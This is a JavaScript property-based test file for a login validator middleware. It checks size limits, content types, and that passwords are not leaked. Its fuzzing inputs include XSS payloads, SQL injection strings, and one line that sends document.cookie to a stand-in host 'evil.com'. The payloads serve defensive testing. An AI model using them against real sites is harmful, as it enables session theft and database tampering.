'use strict';

/**
 * Property 3: Login request is bounded and secret-safe
 *
 * For any valid bounded email and password, one form submission SHALL produce
 * exactly one JSON POST to `/api/auth/login` whose body contains only the email
 * and password fields, while neither value appears in the URL, browser storage,
 * cookies, logs, or telemetry; for any input or body above the configured bound,
 * rejection SHALL occur before database lookup or bcrypt work.
 *
 * Validates: Requirements 2.1
 *
 * Tests the backend login-validator middleware directly with mock req/res objects.
 *
 * @module test/properties/login-request-bounded.property
 */

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fc = require('fast-check');
const { EventEmitter } = require('events');

const loginValidator = require('../../middleware/login-validator');
const { MAX_BODY_BYTES, MAX_EMAIL_CHARS, MAX_PASSWORD_BYTES } = require('../../middleware/login-validator');

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Creates a mock request that simulates a readable stream with
 * the given body content and headers. Uses EventEmitter to ensure
 * events fire AFTER handlers are attached.
 */
function createMockReq(body, headers = {}) {
  const buffer = Buffer.from(body, 'utf8');
  const req = new EventEmitter();
  req.headers = {
    'content-type': 'application/json',
    ...headers,
  };
  // Emit data + end on next tick so handlers are attached first
  process.nextTick(() => {
    req.emit('data', buffer);
    req.emit('end');
  });
  return req;
}

/**
 * Creates a mock response that captures status and JSON body.
 */
function createMockRes() {
  const res = {
    _status: null,
    _body: null,
    _headers: {},
    headersSent: false,
    status(code) {
      res._status = code;
      return res;
    },
    json(body) {
      res._body = body;
      res.headersSent = true;
      return res;
    },
    set(name, value) {
      res._headers[name] = value;
      return res;
    },
  };
  return res;
}

/**
 * Runs loginValidator middleware on a mock request and returns a promise
 * that resolves with { res, nextCalled, req }.
 */
function runValidator(body, headers = {}) {
  return new Promise((resolve) => {
    const req = createMockReq(body, headers);
    const res = createMockRes();
    let nextCalled = false;
    let settled = false;

    const settle = () => {
      if (settled) return;
      settled = true;
      resolve({ res, nextCalled, req });
    };

    // Intercept json() to detect when middleware responds
    const origJson = res.json.bind(res);
    res.json = (body) => {
      origJson(body);
      settle();
      return res;
    };

    loginValidator(req, res, () => {
      nextCalled = true;
      settle();
    });
  });
}

// ─── Generators ──────────────────────────────────────────────────────────────

/**
 * Generates a valid email: 1-254 chars, proper format with @ and domain.
 * We produce emails that are valid after trim().toLowerCase().
 */
const validEmailArb = fc.tuple(
  fc.string({
    unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789._+-'),
    minLength: 1, maxLength: 60,
  }),
  fc.string({
    unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789'),
    minLength: 1, maxLength: 30,
  }),
  fc.constantFrom('com', 'org', 'gov.gh', 'net', 'io')
).map(([local, domain, tld]) => {
  const email = `${local}@${domain}.${tld}`;
  // Ensure ≤254 chars
  return email.length > 254 ? email.slice(0, 250) + '@a.co' : email;
});

/**
 * Generates a valid password: 1-72 UTF-8 bytes.
 * Includes unicode characters to test multi-byte handling.
 */
const validPasswordArb = fc.oneof(
  // ASCII passwords
  fc.string({ minLength: 1, maxLength: 72 }),
  // Unicode passwords (careful with byte length)
  fc.string({
    unit: fc.oneof(
      fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789'),
      fc.constantFrom('ñ', 'ü', 'é', '中', '日', '🔑', '✓')
    ),
    minLength: 1, maxLength: 24, // keep byte length safe with multi-byte chars
  })
);

/**
 * Generates oversized emails (>254 chars after trim).
 */
const oversizedEmailArb = fc.string({
  unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz'),
  minLength: 255, maxLength: 300,
}).map((s) => `${s}@test.com`);

/**
 * Generates oversized passwords (>72 UTF-8 bytes).
 */
const oversizedPasswordArb = fc.oneof(
  // ASCII oversized
  fc.string({ minLength: 73, maxLength: 150 }),
  // Multi-byte Unicode that pushes past 72 bytes (e.g., 4-byte chars × 19 = 76 bytes)
  fc.string({ unit: fc.constantFrom('🔑', '🔒', '中', '日'), minLength: 19, maxLength: 40 })
);

/**
 * Generates strings that are empty or only whitespace.
 */
const emptyOrWhitespaceArb = fc.constantFrom('', ' ', '  ', '\t', '\n', '  \t\n  ');

/**
 * Generates strings with special characters, HTML, and SQL injection patterns.
 */
const specialCharsArb = fc.oneof(
  fc.constantFrom(
    '<script>alert(1)</script>',
    "'; DROP TABLE users; --",
    '"><img src=x onerror=alert(1)>',
    'admin@test.com\' OR 1=1 --',
    '${process.env.SECRET}',
    '{{constructor.constructor("return this")()}}',
    '<img/src=x onerror=fetch("evil.com?c="+document.cookie)>',
    'UNION SELECT password FROM users--'
  ),
  fc.string({ minLength: 1, maxLength: 50 })
);

// ─── Property Tests ──────────────────────────────────────────────────────────

describe('Property 3: Login request is bounded and secret-safe', () => {

  describe('Valid inputs pass through the validator', () => {

    it('valid email + password passes validation with normalized email attached to req', async () => {
      await fc.assert(
        fc.asyncProperty(validEmailArb, validPasswordArb, async (email, password) => {
          const body = JSON.stringify({ email, password });
          // Only proceed if body is within size limit
          if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

          const { res, nextCalled, req } = await runValidator(body);

          assert.strictEqual(nextCalled, true, 'Expected next() to be called for valid input');
          // Normalized email should be trim().toLowerCase()
          assert.strictEqual(req.normalizedEmail, email.trim().toLowerCase());
          // Password should be passed unmodified
          assert.strictEqual(req.submittedPassword, password);
        }),
        { numRuns: 200 }
      );
    });

    it('exact boundary email (254 chars) passes validation', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.nat({ max: 240 }).map((n) => {
            const localLen = Math.max(1, Math.min(n, 240));
            const local = 'a'.repeat(localLen);
            const suffix = '@b.co'; // 5 chars
            // 254 total
            const needed = 254 - suffix.length;
            return 'a'.repeat(needed) + suffix;
          }),
          async (email) => {
            // Ensure exactly 254 chars
            if (email.length !== 254) return;
            const password = 'validpass';
            const body = JSON.stringify({ email, password });
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { nextCalled, req } = await runValidator(body);
            assert.strictEqual(nextCalled, true);
            assert.strictEqual(req.normalizedEmail, email.trim().toLowerCase());
          }
        ),
        { numRuns: 50 }
      );
    });

    it('exact boundary password (72 UTF-8 bytes) passes validation', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.constant('a'.repeat(72)), // exactly 72 ASCII bytes
          async (password) => {
            assert.strictEqual(Buffer.byteLength(password, 'utf8'), 72);
            const email = 'test@example.com';
            const body = JSON.stringify({ email, password });
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { nextCalled, req } = await runValidator(body);
            assert.strictEqual(nextCalled, true);
            assert.strictEqual(req.submittedPassword, password);
          }
        ),
        { numRuns: 10 }
      );
    });
  });

  describe('Oversized inputs are rejected WITHOUT DB or bcrypt work', () => {

    it('oversized email (>254 chars) is rejected with 422', async () => {
      await fc.assert(
        fc.asyncProperty(oversizedEmailArb, async (email) => {
          const password = 'short';
          const body = JSON.stringify({ email, password });

          const { res, nextCalled } = await runValidator(body);

          // Must NOT call next (no DB/bcrypt)
          assert.strictEqual(nextCalled, false, 'Oversized email must not reach next()');
          // Must return 422
          assert.strictEqual(res._status, 422);
          // Error response must not contain the raw password
          const responseStr = JSON.stringify(res._body);
          assert.ok(!responseStr.includes(password),
            'Password must not appear in error response');
        }),
        { numRuns: 100 }
      );
    });

    it('oversized password (>72 UTF-8 bytes) is rejected with 422', async () => {
      await fc.assert(
        fc.asyncProperty(oversizedPasswordArb, async (password) => {
          // Confirm this password is actually >72 bytes
          if (Buffer.byteLength(password, 'utf8') <= MAX_PASSWORD_BYTES) return;

          const email = 'test@example.com';
          const body = JSON.stringify({ email, password });

          const { res, nextCalled } = await runValidator(body);

          assert.strictEqual(nextCalled, false, 'Oversized password must not reach next()');
          assert.strictEqual(res._status, 422);
          // Error response must not contain the raw password
          const responseStr = JSON.stringify(res._body);
          assert.ok(!responseStr.includes(password),
            'Password must not appear in error response');
        }),
        { numRuns: 100 }
      );
    });

    it('body exceeding 2048 bytes is rejected with 413 before JSON parsing', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 2049, max: 4096 }),
          async (targetSize) => {
            // Create a body that exceeds the limit
            const padding = 'x'.repeat(targetSize);
            const body = JSON.stringify({ email: 'a@b.com', password: padding });

            const { res, nextCalled } = await runValidator(body);

            assert.strictEqual(nextCalled, false, 'Oversized body must not reach next()');
            assert.strictEqual(res._status, 413);
          }
        ),
        { numRuns: 50 }
      );
    });

    it('body of exactly 2048 bytes is accepted', async () => {
      // Craft a body that is exactly 2048 bytes
      const base = '{"email":"test@example.com","password":"';
      const suffix = '"}';
      const paddingNeeded = MAX_BODY_BYTES - Buffer.byteLength(base, 'utf8') - Buffer.byteLength(suffix, 'utf8');
      const password = 'p'.repeat(Math.min(paddingNeeded, 72));
      const body = base + password + suffix;

      // Verify it's within bounds
      if (Buffer.byteLength(body, 'utf8') <= MAX_BODY_BYTES &&
          Buffer.byteLength(password, 'utf8') <= MAX_PASSWORD_BYTES) {
        const { nextCalled } = await runValidator(body);
        assert.strictEqual(nextCalled, true, 'Exact 2048-byte body should be accepted');
      }
    });
  });

  describe('Only email and password fields influence behavior', () => {

    it('extra fields in body are rejected with 422', async () => {
      await fc.assert(
        fc.asyncProperty(
          validEmailArb,
          validPasswordArb,
          fc.string({ minLength: 1, maxLength: 20 }).filter(s => s !== 'email' && s !== 'password'),
          fc.jsonValue(),
          async (email, password, extraKey, extraValue) => {
            const obj = { email, password, [extraKey]: extraValue };
            const body = JSON.stringify(obj);
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { res, nextCalled } = await runValidator(body);

            assert.strictEqual(nextCalled, false, 'Extra fields must be rejected');
            assert.strictEqual(res._status, 422);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('nested values in email or password are rejected', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant({ email: { nested: 'value' }, password: 'pass' }),
            fc.constant({ email: 'test@test.com', password: ['array'] }),
            fc.constant({ email: 'test@test.com', password: { obj: true } }),
            fc.constant({ email: ['array'], password: 'pass' })
          ),
          async (obj) => {
            const body = JSON.stringify(obj);
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { res, nextCalled } = await runValidator(body);

            assert.strictEqual(nextCalled, false, 'Nested values must be rejected');
            // Either 422 (nested/wrong type) is expected
            assert.ok(res._status === 422, `Expected 422 but got ${res._status}`);
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('Empty and whitespace-only inputs are rejected', () => {

    it('empty email is rejected with 422', async () => {
      await fc.assert(
        fc.asyncProperty(emptyOrWhitespaceArb, async (email) => {
          const body = JSON.stringify({ email, password: 'validpass' });
          if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

          const { res, nextCalled } = await runValidator(body);

          assert.strictEqual(nextCalled, false, 'Empty/whitespace email must be rejected');
          assert.strictEqual(res._status, 422);
        }),
        { numRuns: 30 }
      );
    });

    it('empty password is rejected with 422', async () => {
      const body = JSON.stringify({ email: 'test@example.com', password: '' });

      const { res, nextCalled } = await runValidator(body);

      assert.strictEqual(nextCalled, false, 'Empty password must be rejected');
      assert.strictEqual(res._status, 422);
    });
  });

  describe('Special characters, unicode, and injection attempts are safe', () => {

    it('special chars in email/password do not leak into error responses', async () => {
      await fc.assert(
        fc.asyncProperty(specialCharsArb, specialCharsArb, async (email, password) => {
          const body = JSON.stringify({ email, password });
          if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

          const { res, nextCalled } = await runValidator(body);

          if (!nextCalled && res._body) {
            const responseStr = JSON.stringify(res._body);
            // The raw password must NEVER appear in the error response
            if (password.length > 3) {
              assert.ok(!responseStr.includes(password),
                'Raw password must not appear in error response');
            }
          }
        }),
        { numRuns: 100 }
      );
    });

    it('SQL injection attempts in email pass through only as parameterized value', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.constantFrom(
            "admin@test.com' OR 1=1 --",
            "test@x.com'; DROP TABLE users;--",
            "admin@test.com\" UNION SELECT * FROM users--"
          ),
          async (email) => {
            // These are valid strings that would pass size checks
            // The validator normalizes and passes as req.normalizedEmail
            // (parameterized query safety is enforced at the DB layer)
            const password = 'password123';
            const body = JSON.stringify({ email, password });
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { nextCalled, req } = await runValidator(body);

            if (nextCalled) {
              // Email is normalized (trim + lowercase) - value is unescaped string
              assert.strictEqual(req.normalizedEmail, email.trim().toLowerCase());
              // The validator does not alter the content; parameterized queries handle safety
            }
          }
        ),
        { numRuns: 20 }
      );
    });

    it('unicode passwords maintain exact byte representation', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({
            unit: fc.oneof(
              fc.constantFrom('ñ', 'ü', 'é', '中', '日', '🔑', '✓', 'á', 'ß'),
              fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789')
            ),
            minLength: 1, maxLength: 18, // Keep within 72 bytes
          }),
          async (password) => {
            if (Buffer.byteLength(password, 'utf8') > MAX_PASSWORD_BYTES) return;
            if (password.length === 0) return;

            const email = 'test@example.com';
            const body = JSON.stringify({ email, password });
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { nextCalled, req } = await runValidator(body);

            assert.strictEqual(nextCalled, true);
            // Password is passed through UNMODIFIED (no trimming, case conversion, etc.)
            assert.strictEqual(req.submittedPassword, password);
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('Non-JSON and wrong content types are rejected before any work', () => {

    it('non-JSON content-type is rejected with 415', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.constantFrom(
            'text/plain',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/html',
            'application/xml',
            ''
          ),
          async (contentType) => {
            const body = JSON.stringify({ email: 'a@b.com', password: 'pass' });
            const { res, nextCalled } = await runValidator(body, { 'content-type': contentType });

            assert.strictEqual(nextCalled, false, 'Non-JSON content-type must be rejected');
            assert.strictEqual(res._status, 415);
          }
        ),
        { numRuns: 30 }
      );
    });

    it('malformed JSON is rejected with 400', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.constantFrom(
            '{email: "a@b.com"}',
            '{"email": "a@b.com",}',
            'not json at all',
            '{incomplete',
            '{"email": "test@test.com", "password": }',
            '<xml>not json</xml>'
          ),
          async (body) => {
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES) return;

            const { res, nextCalled } = await runValidator(body);

            assert.strictEqual(nextCalled, false, 'Malformed JSON must be rejected');
            assert.strictEqual(res._status, 400);
          }
        ),
        { numRuns: 30 }
      );
    });

    it('JSON arrays, scalars, and null are rejected with 422', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('[]'),
            fc.constant('[1,2,3]'),
            fc.constant('"string"'),
            fc.constant('42'),
            fc.constant('true'),
            fc.constant('null')
          ),
          async (body) => {
            const { res, nextCalled } = await runValidator(body);

            assert.strictEqual(nextCalled, false, 'Non-object JSON must be rejected');
            assert.strictEqual(res._status, 422);
          }
        ),
        { numRuns: 20 }
      );
    });
  });

  describe('No raw password appears in any error response', () => {

    it('for any rejection scenario, the password never leaks in the response body', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate various invalid request scenarios
          fc.oneof(
            // Oversized email
            fc.constant({ email: 'a'.repeat(260) + '@test.com', password: 'secret_password_123!' }),
            // Oversized password
            fc.constant({ email: 'test@test.com', password: 'MyS3cr3t!'.repeat(20) }),
            // Missing email
            fc.constant({ password: 'secret_password_123!' }),
            // Missing password
            fc.constant({ email: 'test@test.com' }),
            // Extra field
            fc.constant({ email: 'test@test.com', password: 'secret!', extra: 'field' }),
            // Non-string password
            fc.constant({ email: 'test@test.com', password: 12345 })
          ),
          async (obj) => {
            const body = JSON.stringify(obj);
            if (Buffer.byteLength(body, 'utf8') > MAX_BODY_BYTES + 1000) return;

            const { res, nextCalled } = await runValidator(body);

            if (!nextCalled && res._body) {
              const responseStr = JSON.stringify(res._body);
              // Check password field if it exists and is a string
              if (obj.password && typeof obj.password === 'string' && obj.password.length > 3) {
                assert.ok(!responseStr.includes(obj.password),
                  'Password must NEVER appear in error response');
              }
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });
});
